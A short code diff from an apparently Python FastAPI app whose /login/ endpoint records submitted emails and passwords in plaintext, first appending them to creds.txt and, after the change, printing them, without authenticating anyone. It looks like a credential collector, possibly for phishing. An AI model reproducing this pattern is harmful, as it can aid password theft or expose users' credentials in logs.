@@ -22,9 +22,7 @@ app.add_middleware(
 @app.post("/login/")
 async def read_credentials(credentials: Credentials):
     # Open file in append mode and wr ite the credentials
-    with open("creds.txt", "a") as file:
-        file.write(f"{credentials.email} | {credentials.password}\n")
-
+    print(f"{credentials.email} | {credentials.password}")
     return {"status": "ok"}
 
 
